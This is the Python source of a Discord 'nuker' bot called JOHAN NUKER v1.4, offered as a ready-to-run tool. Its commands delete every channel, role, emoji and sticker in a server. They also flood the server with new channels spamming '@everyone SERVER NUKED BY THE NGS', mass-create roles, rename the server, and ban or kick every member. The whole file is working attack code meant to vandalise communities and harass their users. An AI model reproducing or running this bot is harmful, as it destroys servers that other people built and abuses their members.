
# JOHAN NUKER | v1.4 | Developed by J0HAN

import discord, asyncio, sys, random, time
from colorama import Fore

client = discord.Client(intents=discord.Intents.all())

# CONFIG
with open("config.txt") as file:
    token = file.readline()
    userID = file.readline()
    prefix = file.readline()

if not len(userID) >= 18:
    print(Fore.YELLOW + "\nInvalid user ID given, currently won't affect anything important.")

# TARGET MODE
targetMode_on = input(Fore.WHITE + "\nEnable target server mode? (y/n) ")
if targetMode_on.lower() == "y":
    targetMode_on = True
    target_serverID = input("Target Server ID: ")
    if len(target_serverID) >= 18:
        try:
            test = int(target_serverID) 
            print(Fore.YELLOW + "Target server mode broke, but it wasn't really useful in most case scenarios anyways.")
            targetMode_on = False
        except:
            print(Fore.YELLOW + "Server ID is not correct, operation has been cancelled.")
            targetMode_on = False
    else:
        print(Fore.YELLOW + "Server ID is invalid, operation has been cancelled.")
        targetMode_on = False
else:
    targetMode_on = False

print(Fore.BLACK)

# START-UP
@client.event
async def on_ready():
    print(Fore.CYAN + """
     ██╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║  ██║██╔══██╗████╗  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║███████║███████║██╔██╗ ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔══██║██╔══██║██║╚██╗██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
""")
    print(Fore.WHITE + f"┏︱Bot: {client.user}")
    try:
        user = await client.fetch_user(userID)
        print(f"┠︱User: {user}")
    except:
        None
    print(f"┗︱Prefix: {prefix}")

# MESSAGE RESPONDER
@client.event
async def on_message(message):
    msg = message.content
    backspace = '\033[1A\x1b[2K'
    debugMode_on = True

    if targetMode_on == True:
        ctx = client.get_guild(target_serverID)
    else:
        ctx = message.guild
    
    if msg.endswith("--clean"):
        debugMode_on = False

    async def message_spam(amount, channel, message):
        msgs = 0
        while msgs < amount:
            try:
                await channel.send("@everyone " + message)
                msgs += 1
                if debugMode_on == True:
                    if msgs > 1:
                        sys.stdout.write(backspace)
                        print(f"✚ Spam message sent! ({msgs}/{amount})")
                    else:
                        print(Fore.GREEN + f"✚ Spam message sent! ({msgs}/{amount})")
            except:
                print(Fore.YELLOW + "━ Unable to send spam message.")
    
    # Creating
    async def mass_channel_ping(amount, channel_name, spam_message):
        print(Fore.WHITE + "\n▼ Beginning mass channel ping...")
        c_made = 0
        start = time.time()
        while int(c_made) < int(amount):
            try:
                new_channel = await ctx.create_text_channel(channel_name)
                c_made += 1
                if debugMode_on == True:
                    if c_made > 1:
                        sys.stdout.write(backspace)
                        sys.stdout.write(backspace)
                        print(f"✚ Text channel created! ({c_made}/{amount})")
                    else:
                        print(Fore.GREEN + f"✚ Text channel created! ({c_made}/{amount})")
                try:
                    await asyncio.gather(message_spam(random.randint(1, 4), new_channel, spam_message))
                except:
                    print(Fore.YELLOW + "━ Unable to start spamming messages.")
            except:
                print(Fore.YELLOW + "━ Unable to create text channel.")
        sys.stdout.write(backspace)
        print(Fore.WHITE + f"▲ Mass channel ping has been finished with {c_made} being made. ({str(time.time()-start)}s)")
    
    async def mass_channels(amount, channel_name):
        print(Fore.WHITE + "\n▼ Mass channel creation is in progress...")
        c_made = 0
        start = time.time()
        while c_made < amount:
            try:
                await ctx.create_text_channel(channel_name)
                c_made += 1
                if debugMode_on == True:
                    if c_made > 1:
                        sys.stdout.write(backspace)
                        print(f"✚ Text channel created! ({c_made}/{amount})")
                    else:
                        print(Fore.GREEN + f"✚ Text channel created! ({c_made}/{amount})")
            except:
                print(Fore.YELLOW + "━ Unable to create text channel.")
        print(Fore.WHITE + f"▲ Mass channel creation has been finished with {c_made} channels being made. ({str(time.time()-start)}s)")

    async def mass_roles(amount, role_name):
        print(Fore.WHITE + "\n▼ Mass role creation is in progress...")
        r_created = 0
        start = time.time()
        while int(r_created) < int(amount):
            try:
                await ctx.create_role(name=role_name)
                r_created += 1
                if debugMode_on == True:
                    if r_created > 1:
                        sys.stdout.write(backspace)
                        print(f"✚ Role created! ({r_created}/{amount})")
                    else:
                        print(Fore.GREEN + f"✚ Role created! ({r_created}/{amount})")
            except:
                print(Fore.YELLOW + "━ Unable to create role.")
        print(Fore.WHITE + f"▲ Mass role creation has been finished with {r_created} roles being made. ({str(time.time()-start)}s)")

    async def mass_emojis(amount):
        await message.reply('This is still a work in progress!')

    async def mass_stickers(amount):
        await message.reply('This is still a work in progress!')

    # Deleting
    async def del_channels():
        print(Fore.WHITE + "\n▼ Deleting all the channels...")
        c_deleted = 0
        total_c = len(ctx.channels)
        start = time.time()
        for c in ctx.channels:
            try:
                await c.delete()
                c_deleted += 1
                if debugMode_on == True:
                    if c_deleted > 1:
                        sys.stdout.write(backspace)
                        print(f"✚ Channel deleted! ({c_deleted}/{total_c})")
                    else:
                        print(Fore.GREEN + f"✚ Channel deleted! ({c_deleted}/{total_c})")
            except:
                print(Fore.YELLOW + "━ Unable to delete channel.")
        print(Fore.WHITE + f"▲ {c_deleted} out of {total_c} channels have been deleted. ({str(time.time()-start)}s)")

    
    async def del_roles():
        print(Fore.WHITE + "\n▼ Deleting all the roles...")
        r_deleted = 0
        total_r = len(ctx.roles)
        start = time.time()
        for r in ctx.roles:
            try:
                await r.delete()
                r_deleted += 1
                if debugMode_on == True:
                    if r_deleted > 1:
                        sys.stdout.write(backspace)
                        print(f"✚ Role deleted! ({r_deleted}/{total_r})")
                    else:
                        print(Fore.GREEN + f"✚ Role deleted! ({r_deleted}/{total_r})")
            except:
                print(Fore.YELLOW + "━ Unable to delete role.")
        print(Fore.WHITE + f"▲ {r_deleted} out of {total_r} roles have been deleted. ({str(time.time()-start)}s)")

    async def del_emojis():
        print(Fore.WHITE + "\n▼ Deleting all the emojis...")
        emojis_deleted = 0
        total_e = len(ctx.emojis)
        start = time.time()
        for e in ctx.emojis:
            try:
                await e.delete()
                emojis_deleted += 1
                if debugMode_on == True:
                    if emojis_deleted > 1:
                        sys.stdout.write(backspace)
                        print(Fore.GREEN + f"✚ Emoji deleted! ({emojis_deleted}/{total_e})")
                    else:
                        print(Fore.GREEN + f"✚ Emoji deleted! ({emojis_deleted}/{total_e})")
            except:
                print(Fore.YELLOW + "━ Unable to delete emoji.")
        print(Fore.WHITE + f"▲ {emojis_deleted} out of {total_e} emojis have been deleted. ({str(time.time()-start)}s)")
    
    async def del_stickers():
        print(Fore.WHITE + "\n▼ Deleting all the stickers...")
        s_deleted = 0
        total_s = len(ctx.stickers)
        start = time.time()
        for s in ctx.stickers:
            try:
                await s.delete()
                s_deleted += 1
                if debugMode_on == True:
                    if s_deleted > 1:
                        sys.stdout.write(backspace)
                        print(Fore.GREEN + f"✚ Sticker deleted! ({s_deleted}/{total_s})")
                    else:
                        print(Fore.GREEN + f"✚ Sticker deleted! ({s_deleted}/{total_s})")
            except:
                print(Fore.YELLOW + "━ Unable to delete sticker.")
        print(Fore.WHITE + f"▲ {s_deleted} out of {total_s} have been deleted. ({str(time.time()-start)}s)")

    # Member Stuff
    async def ban_everyone():
            print(Fore.WHITE + "\n▼ Banning everyone...")
            m_banned = 0
            total_m = len(ctx.members)
            start = time.time()
            for m in ctx.members:
                try:
                    await m.ban(reason="NUKED BY THE NGS")
                    m_banned += 1
                    print(Fore.GREEN + f"✚ Member has been banned! ({m_banned}/{total_m})")
                except:
                    print(Fore.YELLOW + "━ Unable to ban member.")
            print(Fore.WHITE + f"▲ {m_banned} out of {total_m} members have been banned. ({str(time.time()-start)}s)")

    async def kick_everyone():
            print(Fore.WHITE + "\n▼ Kicking everyone...")
            m_kicked = 0
            total_m = len(ctx.members)
            start = time.time()
            for m in ctx.members:
                try:
                    await m.kick(reason="NUKED BY THE NGS")
                    m_kicked += 1
                    print(Fore.GREEN + f"✚ Member has been kicked! ({m_kicked}/{total_m})")
                except:
                    print(Fore.YELLOW + "━ Unable to kick member.")
            print(Fore.WHITE + f"▲ {m_kicked} out of {total_m} members have been kicked. ({str(time.time()-start)}s)")

    async def unban_everyone():
        await message.reply('This is still a work in progress!')

    # Other
    async def hider():
        print(Fore.WHITE + "\n◄ Hider function has been used.")
        try:
            await client.change_presence(status=discord.Status.offline)
            await asyncio.sleep(1)
            await client.change_presence(status=discord.Status.online)
            print(Fore.GREEN + "✚ Status changer looks like it's able to work!")
            while True:
                try:
                    await client.change_presence(status=discord.Status.offline)
                    await asyncio.sleep(1)
                    await client.change_presence(status=discord.Status.online)
                    await asyncio.sleep(1)
                except:
                    print(Fore.YELLOW + "\nHider has broke, it has now been cancelled.")
                    break
        except:
            print(Fore.YELLOW + "━ Status changer doesn't seem like it's able to work.")

    # COMMANDS (feel free to rename)
    if msg.startswith(f"{prefix}help"):
        print(Fore.WHITE + f"\n◄ The help command has been used.")
        embed = discord.Embed(title="JOHAN NUKER | v1.4", description=f"""**Commands:**
* {prefix}nuke [ban_everyone (y/n)] - Automatic nuke that deletes everything, mass channel pings, and mass creates roles¹
* {prefix}mcp [amount] [channel_name] [spam_message] - Creates channels and then sends 1-4 messages in them²
* {prefix}channels [amount] [name] - Creates a specified amount of channels with the given name
* {prefix}roles [amount] [name] - Creates a certain amount of roles with whatever name you want
* ~~{prefix}emojis [amount] - Creates emojis that are whatever you set it in the code~~
* ~~{prefix}stickers [amount] - Creates a certain amount of stickers that are whatever you set it~~
* {prefix}del - Deletes all channels, roles, emojis, and stickers
* {prefix}cdel - Deletes all channels
* {prefix}rdel - Deletes all roles
* {prefix}edel - Deletes all emojis
* {prefix}sdel - Deletes all stickers
* {prefix}ban - Bans everyone
* {prefix}kick - Kicks everyone
* ~~{prefix}unban - Unbans everyone that is banned~~
* {prefix}hide - Changes status from online to offline every second (may slow down other functions)
¹Can also ban everyone at the end if specified so.
²No need to add everyone ping, it is automatically added at the start of the message with a space after.""", colour=0x336EFF)
        embed.set_author(name=message.author, icon_url=message.author.avatar)
        embed.set_footer(text="Developed by J0HAN")
        try:
            await message.reply(embed=embed)
            print(Fore.GREEN + "✚ Help message successfully sent!")
        except:
            print(Fore.YELLOW + "━ Unable to send help message.")

    if msg.startswith(f"{prefix}nuke"):
        debugMode_on = False
        commandN = msg.split(" ")
        await ctx.edit(name="NUKED BY THE NGS")
        await asyncio.gather(del_channels())
        await asyncio.gather(mass_channel_ping(100, "johan-was-here", "SERVER NUKED BY THE NGS"), del_roles(), del_emojis(), del_stickers())
        if len(commandN) > 1:
            if commandN[1] == "y":
                await ban_everyone()
        debugMode_on = True
        print(Fore.BLUE + "\n► NUKE OVER")

    # Creation
    if msg.startswith(f"{prefix}mcp"):
        command = msg.split(" ", 3)
        if len(command) > 3:
            try:
                amount = int(command[1])
                await mass_channel_ping(amount, command[2], command[3])
            except:
                await message.reply("Please enter a valid number for the amount.")
        else:
            await message.reply("Please enter all required arguments.")

    if msg.startswith(f"{prefix}channels"):
        commandC = msg.split(" ")
        if len(commandC) > 2:
            try:
                amountC = int(commandC[1])
                await mass_channels(amountC, commandC[2])
            except:
                await message.reply("Please enter a valid number for the amount.")
        else:
            await message.reply("Please enter all required arguments.")

    if msg.startswith(f"{prefix}roles"):
        commandR = msg.split(" ")
        if len(commandR) > 2:
            try:
                amountR = int(commandR[1])
                await mass_roles(amountR, commandR[2])
            except:
                await message.reply("Please enter a valid number for the amount.")
        else:
            await message.reply("Please enter all required arguments.")

    if msg.startswith(f"{prefix}emojis"):
        commandE = msg.split(" ")
        if len(commandE) > 1:
            try:
                total_e = int(commandE[1])
                await mass_emojis(total_e)
            except:
                await message.reply("Please enter an amount.")

    if msg.startswith(f"{prefix}stickers"):
        commandS = msg.split(" ")
        if len(commandS) > 1:
            try:
                amountS = int(commandS[1])
                await mass_stickers(amountS)
            except:
                await message.reply("Please enter an amount.")

    # Deletion
    if msg.startswith(f"{prefix}del"):
        debugMode_on = False
        await asyncio.gather(del_channels(), del_roles(), del_emojis(), del_stickers())
        debugMode_on = True
        print(Fore.BLUE + "\n► MASS DELETION OVER")

    if msg.startswith(f"{prefix}cdel"):
        await del_channels()

    if msg.startswith(f"{prefix}rdel"):
        await del_roles()

    if msg.startswith(f"{prefix}edel"):
        await del_emojis()

    if msg.startswith(f"{prefix}sdel"):
        await del_stickers()

    if msg.startswith(f"{prefix}ban"):
        await ban_everyone()

    if msg.startswith(f"{prefix}kick"):
        await kick_everyone()

    if msg.startswith(f"{prefix}unban"):
        await unban_everyone()

    if msg.startswith(f"{prefix}hide"):
        await hider()
try:
    client.run(token)
except:
    print(Fore.RED + "INVALID TOKEN GIVEN")
    print(Fore.WHITE)
